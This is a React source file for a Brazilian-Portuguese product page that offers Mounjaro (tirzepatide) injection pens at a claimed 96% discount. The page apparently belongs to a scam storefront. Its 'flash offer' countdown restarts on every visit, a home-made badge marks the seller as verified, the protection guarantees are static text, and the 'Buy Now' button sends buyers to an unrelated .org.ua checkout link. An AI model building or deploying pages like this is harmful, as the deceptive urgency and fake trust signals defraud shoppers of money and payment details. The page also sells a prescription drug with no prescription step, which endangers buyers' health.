import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft, ShoppingCart, MoreHorizontal, ChevronRight, ChevronLeft, Bookmark, Star, Zap, Shield } from "lucide-react";

// Components
import ReviewSection from "@/components/ReviewSection";

// Images
import foto1 from "@/assets/mounjaro/foto1.png";
import foto2 from "@/assets/mounjaro/foto2.webp";
import foto3 from "@/assets/mounjaro/foto3.webp";
import foto4 from "@/assets/mounjaro/foto4.jpg";
import slimhealthLogo from "@/assets/slimhealth-logo.png";
import ticketImg from "@/assets/ticket.png";
import entregaImg from "@/assets/entrega.png";
import storeImg from "@/assets/store.png";
import chatImg from "@/assets/chat.png";
import setaImg from "@/assets/seta.png";
const ProductMounjaro = () => {
  const navigate = useNavigate();
  const [currentSlide, setCurrentSlide] = useState(0);
  const [countdown, setCountdown] = useState({ h: 0, m: 9, s: 37 });
  const trackRef = useRef<HTMLDivElement>(null);

  const images = [
    { src: foto1, alt: "Mounjaro™️ 5 mg — Caneta injetável" },
    { src: foto2, alt: "Embalagem do Mounjaro™️ com QR code" },
    { src: foto3, alt: "Mounjaro™️ 5 mg — Vista lateral" },
    { src: foto4, alt: "Mounjaro™️ 5 mg — Produto na mão" },
  ];

  // Countdown timer
  useEffect(() => {
    let remaining = 9 * 60 + 37;
    const timer = setInterval(() => {
      if (remaining <= 0) {
        clearInterval(timer);
        return;
      }
      remaining--;
      const h = Math.floor(remaining / 3600);
      const m = Math.floor((remaining % 3600) / 60);
      const s = remaining % 60;
      setCountdown({ h, m, s });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  // Handle carousel scroll
  const handleScroll = () => {
    if (!trackRef.current) return;
    const w = trackRef.current.clientWidth;
    const i = Math.round(trackRef.current.scrollLeft / w);
    setCurrentSlide(i);
  };

  const scrollTo = (index: number) => {
    if (!trackRef.current) return;
    const x = index * trackRef.current.clientWidth;
    trackRef.current.scrollTo({ left: x, behavior: "smooth" });
    setCurrentSlide(index);
  };

  const handleShare = async () => {
    try {
      if (navigator.share) {
        await navigator.share({ title: document.title, url: location.href });
      } else {
        await navigator.clipboard.writeText(location.href);
      }
    } catch (e) {}
  };

  const handleAddToCart = () => {
    console.log("Adicionado ao carrinho: Mounjaro");
  };

  const handleBuyNow = () => {
    window.location.href = "https://ambienteseguro.org.ua/c/2907df25b1";
  };

  const formatTime = (n: number) => String(n).padStart(2, "0");


  return (
    <div className="min-h-screen bg-background pb-[103px]">
      {/* Header */}
      <header className="sticky top-0 z-50 bg-background/95 backdrop-blur border-b">
        <div className="max-w-screen-sm mx-auto px-3">
          <div className="h-12 flex items-center justify-between">
            <button
              onClick={() => navigate("/")}
              className="p-2 rounded-lg hover:bg-muted active:scale-95 transition"
              aria-label="Voltar"
            >
              <ArrowLeft className="w-5 h-5" strokeWidth={1.8} />
            </button>

            <div className="flex items-center gap-4">
              <button
                onClick={handleShare}
                className="p-2 rounded-lg hover:bg-muted active:scale-95 transition"
                aria-label="Compartilhar"
              >
                <img src={setaImg} alt="Compartilhar" className="w-5 h-5 object-contain" />
              </button>

              <button
                onClick={() => navigate("/")}
                className="p-2 rounded-lg hover:bg-muted active:scale-95 transition"
                aria-label="Carrinho"
              >
                <ShoppingCart className="w-[22px] h-[22px]" />
              </button>

              <button className="p-2 rounded-lg hover:bg-muted active:scale-95 transition" aria-label="Mais opções">
                <MoreHorizontal className="w-6 h-6" />
              </button>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-screen-sm mx-auto">
        {/* Gallery */}
        <section className="relative">
          <div
            ref={trackRef}
            onScroll={handleScroll}
            className="overflow-x-auto overflow-y-hidden snap-x snap-mandatory scroll-smooth no-scrollbar"
            style={{ scrollbarWidth: "none", msOverflowStyle: "none" }}
          >
            <div className="flex w-full h-full">
              {images.map((img, idx) => (
                <div key={idx} className="basis-full shrink-0 snap-center">
                  <div className="aspect-square bg-white">
                    <img
                      src={img.src}
                      alt={img.alt}
                      className="w-full h-full object-contain"
                      loading={idx === 0 ? "eager" : "lazy"}
                    />
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Counter */}
          <div className="absolute bottom-2 right-2 text-[11px] px-2 py-1 rounded-full bg-black/60 text-white">
            {currentSlide + 1}/{images.length}
          </div>

          {/* Navigation arrows */}
          {currentSlide > 0 && (
            <button
              onClick={() => scrollTo(currentSlide - 1)}
              className="absolute left-2 top-1/2 -translate-y-1/2 p-2 rounded-full bg-black/50 text-white hover:bg-black/70 active:scale-95 transition shadow-lg"
              aria-label="Anterior"
            >
              <ChevronLeft className="w-5 h-5" />
            </button>
          )}
          {currentSlide < images.length - 1 && (
            <button
              onClick={() => scrollTo(currentSlide + 1)}
              className="absolute right-2 top-1/2 -translate-y-1/2 p-2 rounded-full bg-black/50 text-white hover:bg-black/70 active:scale-95 transition shadow-lg"
              aria-label="Próximo"
            >
              <ChevronRight className="w-5 h-5" />
            </button>
          )}
        </section>

        {/* Flash Price */}
        <section className="bg-gradient-to-r from-primary via-[#ff5a5f] to-[#ff8a3d] text-white p-3 flex items-end justify-between gap-3">
          <div>
            <div className="flex items-center gap-2">
              <span className="inline-flex items-center gap-1 text-[11px] font-bold bg-white/90 text-primary px-1.5 py-[2px] rounded-md">
                -96%
              </span>
              <span className="text-[22px] font-extrabold leading-none">R$ 67,90</span>
            </div>
            <div className="mt-1 text-[12px] text-white/70 line-through">R$ 1.789,87</div>
          </div>
          <div className="text-right">
            <div className="flex items-center justify-end gap-1 text-[13px] font-semibold">
              <Zap className="w-4 h-4" fill="currentColor" />
              <span>Oferta Relâmpago</span>
            </div>
            <div className="text-[15px]">
              Termina em{" "}
              <span className="font-bold">
                {formatTime(countdown.h)}:{formatTime(countdown.m)}:{formatTime(countdown.s)}
              </span>
            </div>
          </div>
        </section>

        {/* Info / Title / Delivery */}
        <section className="px-3 py-3">
          {/* Promo banner */}
          <button className="w-full text-[12px] bg-accent text-accent-foreground px-3 py-2 rounded-lg">
            <span className="inline-flex items-center justify-between w-full gap-2 font-bold">
              <span className="inline-flex items-center gap-2">
                <img src={ticketImg} alt="Ticket" className="w-4 h-4" />
                <span>Compre R$ 39 e ganhe 10% de desconto</span>
              </span>
              <ChevronRight className="w-5 h-5" strokeWidth={1.6} />
            </span>
          </button>

          {/* Title */}
          <div className="mt-3 flex items-start justify-between gap-3">
            <div className="flex items-start gap-1.5">
              <span className="px-1.5 py-[2px] rounded bg-sale text-white text-[11px] font-bold leading-none">
                11.11
              </span>
              <h1 className="text-[15px] font-semibold text-foreground leading-snug">
                Mounjaro™️ 5 mg – Tirzepatida (caneta injetável)
              </h1>
            </div>
            <button className="p-1 rounded hover:bg-muted" aria-label="Salvar">
              <Bookmark className="w-5 h-5" strokeWidth={1.6} />
            </button>
          </div>

          {/* Rating */}
          <div className="mt-1 flex items-center gap-2 text-[13px]">
            <span className="inline-flex items-center gap-1 text-warning font-semibold">
              <Star className="w-[18px] h-[18px]" fill="currentColor" />
              4.9
            </span>
            <span className="text-sky-600">(3)</span>
            <span className="text-muted-foreground">• 2.977 vendidos</span>
          </div>

          <div className="my-3 border-b" />

          {/* Delivery */}
          <div className="flex items-start justify-between gap-3">
            <div className="space-y-1">
              <div className="flex items-center gap-2 text-[13px]">
                <img src={entregaImg} alt="Entrega" className="w-4 h-4" />
                <span className="px-2 py-[2px] rounded bg-success-light text-success font-semibold">
                  Frete grátis
                </span>
                <span className="text-foreground">Receba de 1 até 15 de fevereiro</span>
              </div>
              <div className="text-[12px] text-muted-foreground">
                Taxa de envio: <span className="line-through">R$ 9,60</span>
              </div>
            </div>
            <button className="p-1 rounded hover:bg-muted" aria-label="Detalhes de entrega">
              <ChevronRight className="w-5 h-5" strokeWidth={1.6} />
            </button>
          </div>
        </section>

        {/* Customer Protection */}
        <section className="bg-[#fdf4e9] text-[#8b5e34]">
          <div className="flex items-center justify-between px-3 py-1.5">
            <div className="inline-flex items-center gap-2 font-semibold text-[13px]">
              <Shield className="w-4 h-4" fill="currentColor" />
              Proteção do cliente
            </div>
            <ChevronRight className="w-5 h-5" strokeWidth={1.6} />
          </div>
          <div className="px-3 pb-2 text-[13px] text-[#6b4b2a]">
            <div className="grid grid-cols-2 gap-x-4 gap-y-0.5">
              <div className="flex items-start gap-1.5">
                <span className="text-[#a3773f]">✓</span>
                <span>Devolução gratuita</span>
              </div>
              <div className="flex items-start gap-1.5">
                <span className="text-[#a3773f]">✓</span>
                <span>Reembolso automático por danos</span>
              </div>
              <div className="flex items-start gap-1.5">
                <span className="text-[#a3773f]">✓</span>
                <span>Pagamento seguro</span>
              </div>
              <div className="flex items-start gap-1.5">
                <span className="text-[#a3773f]">✓</span>
                <span>Cupom por atraso na coleta</span>
              </div>
            </div>
          </div>
        </section>

        <div className="h-2 bg-muted" />

        {/* Reviews */}
        <ReviewSection />

        <div className="h-2 bg-muted" />

        {/* Seller */}
        <section className="bg-background px-3 py-3 border-t">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <img
                src={slimhealthLogo}
                alt="SlimHealth Logo"
                className="w-10 h-10 rounded-full object-cover ring-1 ring-border bg-white"
              />
              <div className="leading-tight">
                <div className="flex items-center gap-1.5">
                  <span className="font-bold text-[15px]">SlimHealth Oficial</span>
                  <svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 48 48">
                    <polygon
                      fill="#42a5f5"
                      points="29.62,3 33.053,8.308 39.367,8.624 39.686,14.937 44.997,18.367 42.116,23.995 45,29.62 39.692,33.053 39.376,39.367 33.063,39.686 29.633,44.997 24.005,42.116 18.38,45 14.947,39.692 8.633,39.376 8.314,33.063 3.003,29.633 5.884,24.005 3,18.38 8.308,14.947 8.624,8.633 14.937,8.314 18.367,3.003 23.995,5.884"
                    />
                    <polygon
                      fill="#fff"
                      points="21.396,31.255 14.899,24.76 17.021,22.639 21.428,27.046 30.996,17.772 33.084,19.926"
                    />
                  </svg>
                </div>
                <div className="text-xs text-muted-foreground">427K vendido(s)</div>
              </div>
            </div>

            <button
              onClick={() => navigate("/")}
              className="px-3 py-1.5 rounded-full bg-muted text-foreground font-semibold text-[13px] shadow-sm hover:bg-muted/80 active:scale-95 transition"
            >
              Visitar
            </button>
          </div>
        </section>

        <div className="h-2 bg-muted" />

        {/* About */}
        <section className="bg-background px-3 py-3">
          <h2 className="text-[14px] font-semibold text-foreground">Sobre este produto</h2>

          <div className="mt-2">
            <div className="text-[12px] font-semibold text-foreground">Detalhes</div>
            <div className="mt-2 grid grid-cols-2 gap-x-6 gap-y-2 text-[13px]">
              <div className="text-muted-foreground">Produto</div>
              <div className="text-foreground">Mounjaro™️ 5 mg – Tirzepatida</div>
              <div className="text-muted-foreground">Princípio Ativo</div>
              <div className="text-foreground">Tirzepatida 5 mg</div>
              <div className="text-muted-foreground">Indicação</div>
              <div className="text-foreground">Diabetes tipo 2</div>
              <div className="text-muted-foreground">Apresentação</div>
              <div className="text-foreground">Caneta injetável</div>
              <div className="text-muted-foreground">Frequência</div>
              <div className="text-foreground">Aplicação semanal</div>
            </div>
          </div>

          <div className="my-3 h-px bg-border" />

          <div>
            <div className="text-[12px] font-semibold text-foreground">Descrição do Produto</div>
            <p className="mt-2 text-[13px] text-foreground">
              <b>Mounjaro™️ 5 mg – Tirzepatida (caneta injetável)</b>
              <br /><br />
              Mounjaro™️ é um medicamento injetável de aplicação subcutânea que contém{" "}
              <b>tirzepatida 5 mg</b>, indicado para o tratamento de adultos com{" "}
              <b>diabetes tipo 2</b>, como adjuvante à dieta e exercícios físicos.
              <br /><br />
              A tirzepatida atua como um agonista duplo dos receptores <b>GIP e GLP-1</b>, hormônios
              envolvidos na regulação da glicose e do apetite.
            </p>
          </div>
        </section>

      </main>

      {/* Fixed Action Bar */}
      <div className="fixed inset-x-0 bottom-0 z-50 bg-background border-t shadow-[0_-2px_10px_rgba(0,0,0,0.06)]">
        <div className="max-w-screen-sm mx-auto px-3 pt-2 pb-[calc(14px+env(safe-area-inset-bottom))] flex items-end gap-2">
          <button
            onClick={() => navigate("/")}
            className="flex flex-col items-center justify-center w-12 shrink-0 text-[11px] text-muted-foreground"
          >
            <img src={storeImg} alt="Loja" className="w-6 h-6" />
            <span className="mt-0.5 leading-none">Loja</span>
          </button>

          <button className="flex flex-col items-center justify-center w-12 shrink-0 text-[11px] text-muted-foreground">
            <img src={chatImg} alt="Chat" className="w-6 h-6" />
            <span className="mt-0.5 leading-none">Chat</span>
          </button>

          <button
            onClick={handleAddToCart}
            className="flex-1 h-11 rounded-xl bg-muted text-foreground font-semibold text-[14px] leading-tight px-3"
          >
            Adicionar ao<br />carrinho
          </button>

          <button
            onClick={handleBuyNow}
            className="flex-1 h-11 rounded-xl bg-primary text-primary-foreground font-semibold text-[14px] leading-none"
          >
            Comprar Agora
          </button>
        </div>
      </div>
    </div>
  );
};

export default ProductMounjaro;
